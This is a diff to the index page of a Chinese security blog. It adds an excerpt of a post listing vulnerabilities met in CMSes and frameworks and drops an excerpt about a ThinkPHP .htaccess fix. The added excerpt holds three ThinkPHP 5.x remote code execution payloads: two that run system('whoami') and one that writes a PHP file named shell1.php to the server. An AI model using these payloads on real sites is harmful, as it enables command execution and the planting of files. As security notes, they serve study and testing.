@@ -126,6 +126,52 @@
         <article class="article content gallery" itemscope itemprop="blogPost">
     <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
         
+            <a href="../../2019/12/04/%E9%81%87%E5%88%B0%E8%BF%87%E7%9A%84cms%E5%92%8C%E6%A1%86%E6%9E%B6%E7%9A%84%E6%BC%8F%E6%B4%9E/" itemprop="url">遇到过的cms和框架的漏洞</a>
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            
+                <time datetime="2019-12-03T20:26:45.000Z" itemprop="datePublished">Dec 4 2019</time>
+            
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="../../categories/Web/">Web</a>
+        </span>
+        
+        
+        <span class="column is-narrow">
+            
+            
+            3 minutes read (About 452 words)
+        </span>
+        
+    </div>
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <html><head></head><body><h3 id="ThinkPHP-5-0-x&#x3001;5-1-x&#x3001;5-2-x-&#x5168;&#x7248;&#x672C;REC-&#x8FDC;&#x7A0B;&#x547D;&#x4EE4;-&#x4EE3;&#x7801;&#x6267;&#x884C;&#x6F0F;&#x6D1E;"><a href="#ThinkPHP-5-0-x&#x3001;5-1-x&#x3001;5-2-x-&#x5168;&#x7248;&#x672C;REC-&#x8FDC;&#x7A0B;&#x547D;&#x4EE4;-&#x4EE3;&#x7801;&#x6267;&#x884C;&#x6F0F;&#x6D1E;" class="headerlink" title="ThinkPHP 5.0.x&#x3001;5.1.x&#x3001;5.2.x &#x5168;&#x7248;&#x672C;REC(&#x8FDC;&#x7A0B;&#x547D;&#x4EE4;/&#x4EE3;&#x7801;&#x6267;&#x884C;&#x6F0F;&#x6D1E;)"></a>ThinkPHP 5.0.x&#x3001;5.1.x&#x3001;5.2.x &#x5168;&#x7248;&#x672C;REC(&#x8FDC;&#x7A0B;&#x547D;&#x4EE4;/&#x4EE3;&#x7801;&#x6267;&#x884C;&#x6F0F;&#x6D1E;)</h3><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">index.php?s=captcha<br>post:<br>_method=__construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami<br></code></pre></td></tr></tbody></table></figure>
+<p>&#x8FDC;&#x7A0B;&#x6267;&#x884C;&#x547D;&#x4EE4;payload(&#x4E0D;&#x552F;&#x4E00;):</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami<br></code></pre></td></tr></tbody></table></figure>
+<p>&#x5199;&#x6587;&#x4EF6;payload(&#x4E0D;&#x552F;&#x4E00;):</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">index.php?s=/index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell1.php&amp;vars[1][]=&lt;?phpinfo();?&gt;i<br></code></pre></td></tr></tbody></table></figure></body></html>
+        <p class="article-more-link">
+            <a href="../../2019/12/04/%E9%81%87%E5%88%B0%E8%BF%87%E7%9A%84cms%E5%92%8C%E6%A1%86%E6%9E%B6%E7%9A%84%E6%BC%8F%E6%B4%9E/#more">Read More</a>
+        </p>
+    
+    </div>
+    
+    
+</article>
+
+
+
+
+    
+        <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
             <a href="../../2019/12/03/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" itemprop="url">php文件包含</a>
         
     </h1>
@@ -498,52 +544,6 @@
         <html><head></head><body><p><a target="_blank" rel="noopener" href="https://huai.pub/">&#x574F;&#x7537;&#x5B69;</a></p></body></html>
         <p class="article-more-link">
             <a href="../../2019/11/19/web%E5%B8%88%E5%82%85%E4%BB%AC%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%94%B6%E9%9B%86/#more">Read More</a>
-        </p>
-    
-    </div>
-    
-    
-</article>
-
-
-
-
-    
-        <article class="article content gallery" itemscope itemprop="blogPost">
-    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
-        
-            <a href="../../2019/11/19/%E5%80%92%E8%85%BEthinkphp5%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91/" itemprop="url">倒腾thinkphp5的一些坑</a>
-        
-    </h1>
-    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
-        <span class="column is-narrow">
-            
-                <time datetime="2019-11-19T06:31:33.000Z" itemprop="datePublished">Nov 19 2019</time>
-            
-        </span>
-        
-        <span class="column is-narrow article-category">
-            <i class="far fa-folder"></i>
-            <a class="article-category-link" href="../../categories/Web/">Web</a>
-        </span>
-        
-        
-        <span class="column is-narrow">
-            
-            
-            6 minutes read (About 869 words)
-        </span>
-        
-    </div>
-    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
-    
-        <html><head></head><body><h3 id="&#x4E00;&#x3001;Thinkphp5&#x4E2D;No-input-file-specified-&#x95EE;&#x9898;&#x89E3;&#x51B3;"><a href="#&#x4E00;&#x3001;Thinkphp5&#x4E2D;No-input-file-specified-&#x95EE;&#x9898;&#x89E3;&#x51B3;" class="headerlink" title="&#x4E00;&#x3001;Thinkphp5&#x4E2D;No input file specified &#x95EE;&#x9898;&#x89E3;&#x51B3;"></a>&#x4E00;&#x3001;Thinkphp5&#x4E2D;No input file specified &#x95EE;&#x9898;&#x89E3;&#x51B3;</h3><p>.htaccess&#x6587;&#x4EF6;&#x4E2D;&#x7684;</p>
-<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">RewriteRule ^(.*)$ index.php/$1 [QSA,PT,L]<br></code></pre></td></tr></tbody></table></figure>
-
-<p>&#x5728;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#x4F1A;&#x5BFC;&#x81F4;No input file specified.</p>
-<p>&#x4FEE;&#x6539;&#x6210;</p></body></html>
-        <p class="article-more-link">
-            <a href="../../2019/11/19/%E5%80%92%E8%85%BEthinkphp5%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91/#more">Read More</a>
         </p>
     
     </div>
